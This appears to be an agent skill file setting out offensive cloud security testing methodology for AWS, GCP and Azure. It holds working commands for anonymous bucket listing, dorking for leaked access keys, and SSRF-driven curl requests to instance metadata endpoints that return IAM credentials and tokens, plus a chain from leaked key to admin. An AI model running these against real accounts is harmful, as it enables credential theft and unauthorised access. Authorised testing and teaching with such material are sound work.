---
name: cloud-sec
description: "Cloud security (AWS/GCP/Azure): misconfiguration discovery, IAM over-privilege, SSRF-to-IMDS, storage bucket enumeration, serverless, lab tooling."
risk: offensive
when-to-use: "Use when: AWS/GCP/Azure — bucket enumeration, IAM over-privilege, SSRF→IMDS, serverless. Not when: on-prem binaries (use D/F/G) or clusters/containers only (use U)."
---

# Cloud Security

## 1. Attack surface map

| Surface | Examples |
|---------|----------|
| Identity | IAM users/roles, service accounts, federation (OIDC/SAML), keys in git/env |
| Storage | S3/GCS/Azure Blob buckets, container registries |
| Compute | EC2/GCE/VMs, serverless (Lambda/Cloud Functions), containers (U skill) |
| Metadata | IMDS (169.254.169.254), cloud metadata services |
| App-layer | web APIs hitting cloud resources (SSRF, key reuse — B skill) |
| Config | IaC repos (TF/CloudFormation) with secrets, overly broad policies |

## 2. Bucket enumeration (S3 / GCS / Blob)

```
common-names + permutations → probe:
aws s3 ls s3://<name> --no-sign-request        # anonymous read?
gsutil ls gs://<name>                          # GCS public bucket
az storage blob list --account-name <name>     # Azure public container
```
Check ACLs: `s3api get-bucket-acl --bucket <name> --no-sign-request`; listing → object download → look for configs/keys/backups. Google dorking: `site:s3.amazonaws.com <org>`.

## 3. IAM over-privilege & lateral

| Check | Command / tool |
|-------|----------------|
| Who can I be? | `aws sts get-caller-identity`; enumerate roles you can `sts:AssumeRole` |
| Privileges | `aws iam get-account-authorization-details` (needs perms) |
| Keys in public repos | GitHub dorking (V skill): `org:<org> "aws_access_key_id"` |
| Live IAM assessment | `prowler aws --checks` (needs read creds) |
| Attack paths | `cloudfox aws --principal <user>` — visual path: user → assume role → admin |

Key signatures: `AKIA...` (access key), `ASIA...` (session token — needs `aws_session_token`). Try a leaked key with `aws sts get-caller-identity` first (low noise, high value).

## 4. SSRF → IMDS (the classic chain)

SSRF (from B/P5 or webhook/URL features) hitting cloud metadata:

```bash
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# GCP metadata (note: requires special header)
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
**IMDSv2 is token-gated** — attacker needs the `X-aws-ec2-metadata-token` flow: `curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` then repeat with token. SSRF to IMDS still works if the app fetches with a client that supports PUT (rare) — otherwise look for **user-data** leak (IMDSv1 disabled but user-data readable via same SSRF) and cloud-init logs.
Obtained role creds → `aws sts get-caller-identity` → scope via `cloudfox`/`prowler`.

## 5. Serverless & managed services

- Lambda: env vars (secrets), layers (extract with `aws lambda get-layer-version`), IAM role on the function, event injection (untrusted input into function code)
- DynamoDB/S3 backends: overly permissive bucket policies, public tables
- AppSync/GraphQL: field-level auth misconfig (B applies)
- Secrets Manager / SSM Parameter Store: `GetSecretValue` if the leaked role allows; SSRF-to-secrets paths

## 6. Methodology

1. **Budget-aware:** cloud attacks burn real money (spinning instances) — use a sandbox org with budget alerts on; revert every state change.
2. Enumerate: storage buckets → exposed services → leaked keys (V) → IAM posture (`prowler`)
3. Chain: leaked key → enumerate roles → assume role → admin/data
4. Prove: read one object / one secret, screenshot; revert any state changes (delete created objects, terminate instances)
5. Report: per finding — resource, policy/evidence, blast radius, fix (least privilege, IMDSv2, bucket policy).

## 7. Toolchain

prowler (assessment) · cloudfox (attack paths) · pacu (exploitation, AWS) · scoutsuite (legacy, multi-cloud) · aws/gcloud/az CLIs · trufflehog/gitleaks (secret scanning) · tfsec/checkov (IaC scanning) · CloudFox. Versions: TOOLS.md.

## 8. Anti-patterns

- Testing in prod accounts — use a lab account or a sandbox org; budget alerts on
- Forgetting IMDSv2 token flow → false "no metadata access"
- Stopping at "bucket public" — always try to read objects and escalate
- Neglecting user-data as a secret source (IMDSv1-off boxes)
- Forgetting budget alerts before spinning up instances
